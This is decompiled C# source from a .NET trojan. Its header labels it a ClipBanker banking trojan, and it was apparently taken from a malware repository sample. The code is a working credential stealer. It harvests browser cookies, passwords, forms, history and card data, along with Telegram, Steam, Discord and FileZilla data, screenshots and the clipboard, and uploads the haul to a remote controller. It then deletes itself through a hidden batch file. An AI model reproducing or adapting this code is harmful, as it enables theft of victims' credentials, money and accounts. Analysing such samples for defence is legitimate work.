// Decompiled with JetBrains decompiler
// Type: MHD.3zU
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00315d;
using \u0031xm;
using crD;
using H16;
using l6z;
using q54;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace MHD
{
  internal static class \u0033zU
  {
    internal static void iN2([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3) => new Thread(new ThreadStart(new \u0033zU.\u003574()
    {
      \u003756 = obj0,
      X98 = obj1,
      jaQ = obj2,
      \u00337k = obj3
    }.\u00344O)).Start();

    private static void fq7()
    {
      try
      {
        string path = xY7.B84() + "\\" + xY7.\u003842(10) + ".bat";
        string contents = "@echo off\r\nw32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  1>nul\r\ndel /a /q /f \"" + Ej4.\u0034Jt + "\"\r\ndel /a /q /f \"" + path + "\"";
        File.WriteAllText(path, contents);
        Process.Start(new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          FileName = path
        });
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    private sealed class \u003574
    {
      public string \u003756;
      public string X98;
      public string jaQ;
      public string \u00337k;

      internal void \u00344O()
      {
        Dictionary<string, string> dictionary1 = new string(Ej4.\u0038R6).dtU<Dictionary<string, string>>();
        Dictionary<string, object> dictionary2 = new string(Ej4.\u0038R6).dtU<Dictionary<string, object>>();
        try
        {
          Thread.Sleep(TimeSpan.FromSeconds(2.0));
          try
          {
            if ((bool) dictionary2["ASO"])
            {
              if (g79.\u0031Tb("stealerlogstatus", this.\u003756, this.X98, this.jaQ, this.\u00337k) == "1")
              {
                if (!(bool) dictionary2["AD"])
                  return;
                \u0033zU.fq7();
                return;
              }
            }
          }
          catch
          {
          }
          string str1 = dictionary1["ASP"];
          try
          {
            string str2 = str1;
            if (!(str2 == "%SystemDrive% - Slow"))
            {
              if (!(str2 == "%UsersFolder% - Fast"))
              {
                if (str2 == "%AppData% - Very Fast")
                  str1 = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\" + \u0036D4.k4d() + "\\AppData\\";
              }
              else
                str1 = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\";
            }
            else
              str1 = Path.GetPathRoot(Environment.SystemDirectory);
          }
          catch
          {
            str1 = Path.GetPathRoot(Environment.SystemDirectory);
          }
          Dictionary<string, bool> dictionary3 = dictionary1["ASCFG"].dtU<Dictionary<string, bool>>();
          byte[] numArray = new mR9().\u003426(this.\u003756, this.X98, this.jaQ, this.\u00337k, str1, dictionary3["cookies"], dictionary3["passwords"], dictionary3["forms"], dictionary3["history"], dictionary3["cc"], dictionary3["telegram"], dictionary3["steam"], dictionary3["discord"], dictionary3["filezilla"], dictionary3["screenshot"], dictionary3["clipboard"], dictionary3["sysinfo"], true, dictionary3["ignorepartiallyemptydata"], dictionary3["savebrowsersdatatosinglefile"]);
          g79.\u0037l4("stealerlogstatus", "1", this.\u003756, this.X98, this.jaQ, this.\u00337k);
          g79.\u00346H(numArray, "stealer", this.\u003756, this.X98, this.jaQ, this.\u00337k);
          GC.Collect();
        }
        catch
        {
        }
        if (!(bool) dictionary2["AD"])
          return;
        \u0033zU.fq7();
      }
    }
  }
}
